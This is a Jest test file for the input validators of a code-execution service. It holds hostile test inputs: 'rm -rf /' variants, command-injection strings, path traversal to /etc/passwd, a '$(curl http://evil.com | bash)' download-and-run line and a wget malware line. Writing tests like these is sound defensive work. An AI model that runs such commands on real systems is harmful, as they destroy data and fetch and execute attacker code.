import { sanitizeCode, validateLanguage } from '../../utils/validation';

describe('Security - Input Validation and Edge Cases', () => {
    beforeEach(() => {
        jest.clearAllMocks();
    });

    afterEach(() => {
        jest.clearAllMocks();
    });

    describe('String Validation', () => {
        it('should handle Unicode and international characters', () => {
            const unicodeCodes = [
                'console.log("안녕하세요");',
                'print("你好")',
                'System.out.println("مرحبا");',
                'echo "Привет"'
            ];
            unicodeCodes.forEach((code) => {
                expect(() => sanitizeCode(code)).not.toThrow();
            });
        });

        it('should detect dangerous patterns with Unicode characters', () => {
            const hiddenCommands = ['test\u202Emr -rf /'];
            hiddenCommands.forEach((code) => {
                if (code.includes('rm') && code.includes('-rf')) {
                    expect(() => sanitizeCode(code)).toThrow('코드에 위험한 패턴이 포함되어 있습니다.');
                }
            });
        });
    });

    describe('Legitimate Code Patterns', () => {
        it('should accept legitimate loop constructs', () => {
            const legitimateLoops = [
                'for (let i = 0; i < 10; i++) { console.log(i); }',
                'while (x < 100) { x++; }',
                'int i = 0; while(i < 10) { i++; }',
                'for i in range(10): print(i)'
            ];
            legitimateLoops.forEach((code) => {
                expect(() => sanitizeCode(code)).not.toThrow();
            });
        });

        it('should handle large but acceptable code', () => {
            const largeCode = 'function test() { return 42; }\n'.repeat(2000);
            expect(() => sanitizeCode(largeCode)).not.toThrow();
        });

        it('should accept code with comments', () => {
            const commentCodes = [
                '// Just a comment\nprint("hello")',
                '/* Block comment */\nint x = 5;',
                '# Python comment\nprint("test")',
                '<!-- HTML comment in string -->'
            ];
            commentCodes.forEach((code) => {
                expect(() => sanitizeCode(code)).not.toThrow();
            });
        });
    });

    describe('Language Validation Edge Cases', () => {
        it('should reject language injection attempts', () => {
            const maliciousLanguages = [
                'python; rm -rf /',
                'javascript && docker ps',
                'java || shutdown',
                '../../../etc/passwd',
                '../../bin/bash'
            ];
            maliciousLanguages.forEach((lang) => {
                expect(validateLanguage(lang)).toBe(false);
            });
        });

        it('should handle case variations correctly', () => {
            const caseManipulations = [
                { lang: 'PYTHON', valid: true },
                { lang: 'PyThOn', valid: true },
                { lang: 'javascript', valid: true },
                { lang: 'JAVASCRIPT', valid: true }
            ];
            caseManipulations.forEach(({ lang, valid }) => {
                expect(validateLanguage(lang)).toBe(valid);
            });
        });

        it('should reject language with null bytes', () => {
            const nullByteLanguages = ['python\x00', '\x00javascript', 'java\x00script'];
            nullByteLanguages.forEach((lang) => {
                expect(validateLanguage(lang)).toBe(false);
            });
        });
    });

    describe('Boundary Conditions', () => {
        it('should handle all whitespace types', () => {
            expect(() => sanitizeCode('')).toThrow('코드는 비어있을 수 없습니다.');
            expect(() => sanitizeCode('   ')).toThrow('코드는 비어있을 수 없습니다.');
            expect(() => sanitizeCode('\n')).toThrow('코드는 비어있을 수 없습니다.');
            expect(() => sanitizeCode('\t')).toThrow('코드는 비어있을 수 없습니다.');
            expect(() => sanitizeCode('\r\n')).toThrow('코드는 비어있을 수 없습니다.');
        });

        it('should handle code exactly at length boundary', () => {
            const maxLengthCode = 'a'.repeat(100000);
            const overLengthCode = 'a'.repeat(100001);

            expect(() => sanitizeCode(maxLengthCode)).not.toThrow();
            expect(() => sanitizeCode(overLengthCode)).toThrow('코드가 너무 깁니다.');
        });

        it('should handle mixed valid and invalid characters', () => {
            const mixedCode = 'print("Hello");\n\t// Comment\n';
            expect(() => sanitizeCode(mixedCode)).not.toThrow();
        });
    });

    describe('Type Safety', () => {
        it('should reject non-string types for code', () => {
            const nonStrings = [123, { code: 'test' }, ['rm', '-rf', '/'], true, null, undefined, NaN, Infinity];
            nonStrings.forEach((input) => {
                expect(() => sanitizeCode(input as any)).toThrow('코드는 문자열이어야 합니다.');
            });
        });

        it('should reject non-string types for language', () => {
            const nonStrings = [123, { lang: 'python' }, ['python'], true, null, undefined];
            nonStrings.forEach((input) => {
                expect(validateLanguage(input as any)).toBe(false);
            });
        });

        it('should not call toString on objects', () => {
            const objectWithToString = {
                toString: () => 'rm -rf /'
            };
            expect(() => sanitizeCode(objectWithToString as any)).toThrow('코드는 문자열이어야 합니다.');
        });
    });

    describe('Combined Dangerous Patterns', () => {
        it('should detect multiple attack vectors', () => {
            const combinedAttacks = [
                'test; rm -rf / && docker ps',
                '$(curl http://evil.com | bash) && sudo reboot',
                '`wget malware.sh` && shutdown'
            ];
            combinedAttacks.forEach((code) => {
                expect(() => sanitizeCode(code)).toThrow('코드에 위험한 패턴이 포함되어 있습니다.');
            });
        });

        it('should detect patterns with quotes', () => {
            const quotedPatterns = ['do"cker run', 'su"do bash'];
            quotedPatterns.forEach((code) => {
                if (code.toLowerCase().includes('docker') || code.toLowerCase().includes('sudo')) {
                    expect(() => sanitizeCode(code)).toThrow('코드에 위험한 패턴이 포함되어 있습니다.');
                }
            });
        });
    });
});
